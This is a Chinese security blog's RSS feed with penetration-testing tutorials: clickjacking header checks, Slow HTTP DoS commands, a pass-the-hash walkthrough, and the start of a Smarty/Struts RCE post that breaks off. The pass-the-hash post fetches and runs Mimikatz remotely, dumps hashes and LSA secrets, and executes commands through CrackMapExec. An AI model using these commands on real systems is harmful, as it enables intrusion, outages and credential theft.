<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>倾旋的博客</title>
    <description>岁月静好，现世安稳。
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 16 Apr 2018 16:28:12 +0800</pubDate>
    <lastBuildDate>Mon, 16 Apr 2018 16:28:12 +0800</lastBuildDate>
    <generator>Jekyll v3.6.2</generator>
    
      <item>
        <title>《Web安全测试学习手册》- 点击劫持：X-Frame-Options头丢失</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 点击劫持：X-Frame-Options头丢失
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-点击劫持x-frame-options头丢失---介绍&quot;&gt;0x00 点击劫持：X-Frame-Options头丢失 - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是点击劫持x-frame-options头丢失&quot;&gt;1）什么是点击劫持：X-Frame-Options头丢失&lt;/h3&gt;

&lt;p&gt;X-Frame-Options HTTP 响应头， 可以指示浏览器是否应该加载一个 iframe 中的页面。 网站可以通过设置 X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持。&lt;/p&gt;

&lt;h3 id=&quot;2点击劫持x-frame-options头丢失的特点&quot;&gt;2）点击劫持：X-Frame-Options头丢失的特点&lt;/h3&gt;

&lt;p&gt;属于一种具有迷惑性高、利用难度中等、攻击方式单一的攻击手法。&lt;/p&gt;

&lt;h2 id=&quot;0x01-点击劫持x-frame-options头丢失---风险等级&quot;&gt;0x01 点击劫持：X-Frame-Options头丢失 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-点击劫持x-frame-options头丢失---原理&quot;&gt;0x02 点击劫持：X-Frame-Options头丢失 - 原理&lt;/h2&gt;

&lt;p&gt;当X-Frame-Options HTTP 响应头丢失的时候，攻击者可以伪造一个页面，该页面使用前端技术精心构造一些诱惑用户点击的按钮、图片，该元素下方就是一个iframe标签，当用户点击后上层的元素后，就相当于点击了iframe标签引入的网页页面。&lt;/p&gt;

&lt;h2 id=&quot;0x03-点击劫持x-frame-options头丢失---常见场景&quot;&gt;0x03 点击劫持：X-Frame-Options头丢失 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;默认配置的WebServer&lt;/li&gt;
  &lt;li&gt;单一交互的网站（按钮）&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用CURL请求网站，查看响应头是否包含&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -I http://target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;未修复&quot;&gt;未修复&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
HTTP/1.1 200 OK
Server: nginx/1.12.1 (Ubuntu)
Date: Mon, 16 Apr 2018 07:48:51 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
Connection: keep-alive
ETag: &quot;5ac98168-264&quot;
Accept-Ranges: bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不存在&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头。&lt;/p&gt;

&lt;h3 id=&quot;修复后&quot;&gt;修复后&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
HTTP/1.1 200 OK
Server: nginx/1.12.1 (Ubuntu)
Date: Mon, 16 Apr 2018 07:52:08 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
Connection: keep-alive
ETag: &quot;5ac98168-264&quot;
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;p&gt;配置WebServer，更改配置文件，添加自定义响应头&lt;/p&gt;

&lt;p&gt;使用 X-Frame-Options 有三个可选的值：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DENY：浏览器拒绝当前页面加载任何Frame页面&lt;/li&gt;
  &lt;li&gt;SAMEORIGIN：frame页面的地址只能为同源域名下的页面&lt;/li&gt;
  &lt;li&gt;ALLOW-FROM：origin为允许frame加载的页面地址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若网站内有使用iframe标签链接同源资源的，需要设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;SAMEORIGIN&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;

&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; 在所有页面上发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，需要把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;site&lt;/code&gt; 的配置中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Header always append X-Frame-Options SAMEORIGIN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;

&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;server&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;location&lt;/code&gt; 的配置中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;add_header X-Frame-Options SAMEORIGIN;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;

&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，添加下面的配置到 &lt;code class=&quot;highlighter-rouge&quot;&gt;Web.config&lt;/code&gt; 文件中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;system.webServer&amp;gt;
  ...
 
  &amp;lt;httpProtocol&amp;gt;
    &amp;lt;customHeaders&amp;gt;
      &amp;lt;add name=&quot;X-Frame-Options&quot; value=&quot;SAMEORIGIN&quot; /&amp;gt;
    &amp;lt;/customHeaders&amp;gt;
  &amp;lt;/httpProtocol&amp;gt;
 
  ...
&amp;lt;/system.webServer&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-16/3</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/3</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>《Web安全测试学习手册》- Slow HTTP DOS</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- Slow HTTP DDOS
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-slow-http-dos---介绍&quot;&gt;0x00 Slow HTTP DOS - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是slow-http-dos&quot;&gt;1）什么是Slow HTTP DOS&lt;/h3&gt;

&lt;p&gt;Slow HTTP DOS(Slow HTTP Denial of Service Attack)，译为缓慢的HTTP拒绝服务，这类攻击方式出现在许多公开协议中。&lt;/p&gt;

&lt;h3 id=&quot;2slow-http-dos的特点&quot;&gt;2）Slow HTTP DOS的特点&lt;/h3&gt;

&lt;p&gt;Slow HTTP DOS是一个应用层拒绝服务攻击，主要针对协议为HTTP，攻击的成本很低，并且能够消耗服务器端资源，占用客户端连接数，导致正常用户无法连接服务器。&lt;/p&gt;

&lt;h2 id=&quot;0x01-slow-http-dos---风险等级&quot;&gt;0x01 Slow HTTP DOS - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-slow-http-dos---原理&quot;&gt;0x02 Slow HTTP DOS - 原理&lt;/h2&gt;

&lt;p&gt;既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。&lt;/p&gt;

&lt;p&gt;首先HTTP协议的报文都是一行一行的，类似于：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1\r\n
Host : payloads.online\r\n
Connection: keep-alive\r\n
Keep-Alive: 900\r\n
Content-Length: 100000000\r\n
Content_Type: application/x-www-form-urlencoded\r\n
Accept: *.*\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么报文中的&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;是什么？&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;代表一行报文的结束也被称为空行（CLRF），而&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n\r\n&lt;/code&gt;代表整个报文的结束&lt;/p&gt;

&lt;p&gt;从上面贴出的&lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt;请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。&lt;/p&gt;

&lt;p&gt;通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接&lt;code class=&quot;highlighter-rouge&quot;&gt;（HTTP协议为无连接的协议）&lt;/code&gt;；当使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Keep-Alive模式（又称持久连接、连接重用）&lt;/code&gt;时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。&lt;/p&gt;

&lt;p&gt;那么当我们客户端发送一个报文，不以&lt;code class=&quot;highlighter-rouge&quot;&gt;CRLF&lt;/code&gt;结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。&lt;/p&gt;

&lt;p&gt;如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。&lt;/p&gt;

&lt;h2 id=&quot;0x03-slow-http-dos---常见场景&quot;&gt;0x03 Slow HTTP DOS - 常见场景&lt;/h2&gt;

&lt;p&gt;大多出现在默认安装好的Apache Web中，未合理设置客户端连接数导致的。&lt;/p&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用Slow HTTP Test 工具进行检测&lt;/p&gt;

&lt;p&gt;Kali Linux 安装 ：apt-get install slowhttptest&lt;/p&gt;

&lt;p&gt;SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试攻击，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。&lt;/p&gt;

&lt;p&gt;这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。&lt;/p&gt;

&lt;h3 id=&quot;slow-header&quot;&gt;Slow Header&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。&lt;/p&gt;

&lt;h3 id=&quot;slow-read&quot;&gt;Slow Read&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。&lt;/p&gt;

&lt;h3 id=&quot;slow-post&quot;&gt;Slow Post&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1.设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;2.增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13. The old name is still supported.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;3.默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满 Apache 的所有连接&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-16/2</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/2</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>使用CrackMapExec 进行 NTLM Hash传递攻击</title>
        <description>&lt;p&gt;本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;

&lt;p&gt;早期&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;协议在网络上传输明文口令。后来出现 &lt;code class=&quot;highlighter-rouge&quot;&gt;LAN Manager Challenge/Response &lt;/code&gt;验证机制，简称&lt;code class=&quot;highlighter-rouge&quot;&gt;LM&lt;/code&gt;，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p&gt;

&lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;Win2000&lt;/code&gt;开始默认协议为&lt;code class=&quot;highlighter-rouge&quot;&gt;Kerboros&lt;/code&gt;，下列情况会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;遗留客户端或服务器需要登录到网络或本地时。&lt;/li&gt;
  &lt;li&gt;UNIX客户端需要与NT服务器通话时。&lt;/li&gt;
  &lt;li&gt;有正在使用验证&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;的服务器信息块&lt;code class=&quot;highlighter-rouge&quot;&gt;（SMB）&lt;/code&gt;后台程序的UNIX客户端时。&lt;/li&gt;
  &lt;li&gt;也即认证方或被认证方有仅支持NTLM情况时。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;它以&lt;code class=&quot;highlighter-rouge&quot;&gt;挑战/响应（Challenge/Response）&lt;/code&gt;顺序为基础。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1.客户端发送用户名和域名到服务器。&lt;/li&gt;
  &lt;li&gt;2.服务器转发到域控制器DC。&lt;/li&gt;
  &lt;li&gt;3.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;用客户端密码随机产生一个&lt;code class=&quot;highlighter-rouge&quot;&gt;8字节&lt;/code&gt;得挑战&lt;code class=&quot;highlighter-rouge&quot;&gt;（Challenge）&lt;/code&gt;，发送给服务器。&lt;/li&gt;
  &lt;li&gt;4.服务器将挑战转发给客户端。&lt;/li&gt;
  &lt;li&gt;5.客户端用密码经过&lt;code class=&quot;highlighter-rouge&quot;&gt;hash&lt;/code&gt;及&lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt;加密算法等操作得到一个加密结果响应&lt;code class=&quot;highlighter-rouge&quot;&gt;（Response）&lt;/code&gt;发送给服务器。&lt;/li&gt;
  &lt;li&gt;6.服务器将响应转发给&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;7.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;做同样操作验证客户端响应。&lt;/li&gt;
  &lt;li&gt;8.验证结束，返回结果通知服务器。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-ntlm对渗透的作用&quot;&gt;0x02 NTLM对渗透的作用&lt;/h2&gt;

&lt;p&gt;NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。&lt;/p&gt;

&lt;p&gt;最大的特点就是我们可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;执行&lt;code class=&quot;highlighter-rouge&quot;&gt;Command&lt;/code&gt;。&lt;/p&gt;

&lt;h2 id=&quot;0x03-crackmapexec-介绍&quot;&gt;0x03 CrackMapExec 介绍&lt;/h2&gt;

&lt;p&gt;CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。&lt;/p&gt;

&lt;p&gt;WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki&lt;/p&gt;

&lt;h2 id=&quot;0x03-安装crackmapexec&quot;&gt;0x03 安装CrackMapExec&lt;/h2&gt;

&lt;h3 id=&quot;kali-linux&quot;&gt;Kali Linux&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install crackmapexec&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;debianubuntu&quot;&gt;Debian/Ubuntu&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install crackmapexec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x04-传递ntlm-hash执行命令&quot;&gt;0x04 传递NTLM Hash执行命令&lt;/h2&gt;

&lt;h3 id=&quot;使用mimikatz获取ntlm-hash&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Mimikatz&lt;/code&gt;获取&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM Hash&lt;/code&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:\Users\administrator\Documents&amp;gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

PS C:\Users\administrator\Documents&amp;gt;Invoke-Mimikatz

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取NTLM Hash&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;****
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : PAYLOADS
         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
        tspkg :
         * Username : Administrator
         * Domain   : PAYLOADS
         * Password : ****
        wdigest :
         * Username : Administrator
         * Domain   : PAYLOADS
         * Password : ****
        kerberos :
         * Username : Administrator
         * Domain   : PAYLOADS.ONLINE
         * Password : ****
        ssp :
        credman :

****

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;使用crackmapexec执行命令&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;执行命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;使用crackmapexec获取本地密码local-security-authoritylsa&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;获取本地密码(Local Security Authority)LSA&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;more-&quot;&gt;More …&lt;/h3&gt;

&lt;p&gt;后续再加&lt;/p&gt;
</description>
        <pubDate>Tue, 27 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-27/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-27/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>《Web安全测试学习手册》- 远程代码执行</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 远程代码执行
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-远程代码执行---介绍&quot;&gt;0x00 远程代码执行 - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是远程代码执行&quot;&gt;1）什么是远程代码执行&lt;/h3&gt;

&lt;p&gt;远程命令执行 英文名称：&lt;strong&gt;RCE (remote code execution)&lt;/strong&gt; ，简称&lt;strong&gt;RCE&lt;/strong&gt;漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。&lt;/p&gt;

&lt;h3 id=&quot;2远程代码执行的特点&quot;&gt;2）远程代码执行的特点&lt;/h3&gt;

&lt;p&gt;远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。&lt;/p&gt;

&lt;h2 id=&quot;0x01-远程代码执行---风险等级&quot;&gt;0x01 远程代码执行 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-远程代码执行---原理&quot;&gt;0x02 远程代码执行 - 原理&lt;/h2&gt;

&lt;p&gt;由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。&lt;/p&gt;

&lt;h2 id=&quot;0x03-远程代码执行---常见场景&quot;&gt;0x03 远程代码执行 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;使用了危险函数的Web应用&lt;/li&gt;
  &lt;li&gt;低版本的Java语言Struts框架&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;h3 id=&quot;php中常见场景---模板引擎代码执行&quot;&gt;PHP中常见场景 - 模板引擎代码执行&lt;/h3&gt;

&lt;p&gt;Smarty简介&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。&lt;/p&gt;

  &lt;p&gt;CVE-ID : CVE-2017-1000480&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行&lt;/p&gt;

&lt;p&gt;测试Payload：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*/phpinfo();/*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;java-struts2-s2-045&quot;&gt;Java Struts2 （S2-045）&lt;/h3&gt;

&lt;p&gt;Struts 简介&lt;/p&gt;

&lt;blockquote&gt;
